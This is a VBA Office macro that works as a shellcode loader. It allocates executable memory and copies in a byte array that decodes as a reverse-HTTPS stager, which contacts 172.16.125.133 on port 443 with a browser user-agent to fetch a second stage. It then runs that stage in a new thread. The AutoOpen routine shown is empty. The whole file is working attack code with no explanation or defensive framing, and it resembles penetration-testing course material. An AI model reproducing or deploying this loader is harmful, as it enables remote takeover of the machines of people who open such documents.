Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr


Function MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    
buf = Array(252, 232, 143, 0, 0, 0, 96, 137, 229, 49, 210, 100, 139, 82, 48, 139, 82, 12, 139, 82, 20, 49, 255, 139, 114, 40, 15, 183, 74, 38, 49, 192, 172, 60, 97, 124, 2, 44, 32, 193, 207, 13, 1, 199, 73, 117, 239, 82, 87, 139, 82, 16, 139, 66, 60, 1, 208, 139, 64, 120, 133, 192, 116, 76, 1, 208, 139, 72, 24, 80, 139, 88, 32, 1, 211, 133, 201, 116, 60, 49, 255, _
73, 139, 52, 139, 1, 214, 49, 192, 172, 193, 207, 13, 1, 199, 56, 224, 117, 244, 3, 125, 248, 59, 125, 36, 117, 224, 88, 139, 88, 36, 1, 211, 102, 139, 12, 75, 139, 88, 28, 1, 211, 139, 4, 139, 1, 208, 137, 68, 36, 36, 91, 91, 97, 89, 90, 81, 255, 224, 88, 95, 90, 139, 18, 233, 128, 255, 255, 255, 93, 104, 110, 101, 116, 0, 104, 119, 105, 110, 105, 84, _
104, 76, 119, 38, 7, 255, 213, 49, 219, 83, 83, 83, 83, 83, 232, 130, 0, 0, 0, 77, 111, 122, 105, 108, 108, 97, 47, 53, 46, 48, 32, 40, 87, 105, 110, 100, 111, 119, 115, 32, 78, 84, 32, 49, 48, 46, 48, 59, 32, 87, 105, 110, 54, 52, 59, 32, 120, 54, 52, 41, 32, 65, 112, 112, 108, 101, 87, 101, 98, 75, 105, 116, 47, 53, 51, 55, 46, 51, 54, 32, _
40, 75, 72, 84, 77, 76, 44, 32, 108, 105, 107, 101, 32, 71, 101, 99, 107, 111, 41, 32, 67, 104, 114, 111, 109, 101, 47, 49, 49, 55, 46, 48, 46, 48, 46, 48, 32, 83, 97, 102, 97, 114, 105, 47, 53, 51, 55, 46, 51, 54, 32, 69, 100, 103, 47, 49, 49, 55, 46, 48, 46, 50, 48, 52, 53, 46, 52, 55, 0, 104, 58, 86, 121, 167, 255, 213, 83, 83, 106, 3, _
83, 83, 104, 187, 1, 0, 0, 232, 214, 0, 0, 0, 47, 109, 103, 89, 104, 86, 76, 49, 115, 116, 102, 48, 105, 108, 105, 79, 88, 82, 48, 76, 104, 50, 65, 48, 106, 69, 68, 103, 50, 84, 50, 57, 120, 116, 53, 106, 109, 82, 99, 67, 72, 67, 115, 48, 102, 83, 99, 69, 111, 72, 101, 110, 50, 117, 115, 117, 111, 113, 69, 67, 71, 111, 88, 95, 118, 113, 115, 66, _
115, 89, 69, 67, 67, 98, 68, 120, 53, 53, 75, 56, 120, 119, 121, 108, 116, 56, 103, 74, 90, 56, 0, 80, 104, 87, 137, 159, 198, 255, 213, 137, 198, 83, 104, 0, 2, 104, 132, 83, 83, 83, 87, 83, 86, 104, 235, 85, 46, 59, 255, 213, 150, 106, 10, 95, 83, 83, 83, 83, 86, 104, 45, 6, 24, 123, 255, 213, 133, 192, 117, 20, 104, 136, 19, 0, 0, 104, 68, 240, _
53, 224, 255, 213, 79, 117, 225, 232, 75, 0, 0, 0, 106, 64, 104, 0, 16, 0, 0, 104, 0, 0, 64, 0, 83, 104, 88, 164, 83, 229, 255, 213, 147, 83, 83, 137, 231, 87, 104, 0, 32, 0, 0, 83, 86, 104, 18, 150, 137, 226, 255, 213, 133, 192, 116, 207, 139, 7, 1, 195, 133, 192, 117, 229, 88, 195, 95, 232, 127, 255, 255, 255, 49, 55, 50, 46, 49, 54, 46, 49, _
50, 53, 46, 49, 51, 51, 0, 187, 224, 29, 42, 10, 104, 166, 149, 189, 157, 255, 213, 60, 6, 124, 10, 128, 251, 224, 117, 5, 187, 71, 19, 114, 111, 106, 0, 83, 255, 213)



    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    res = CreateThread(0, 0, addr, 0, 0, 0)

End Function

Sub AutoOpen()
'
' AutoOpen Macro
'
'

End Sub
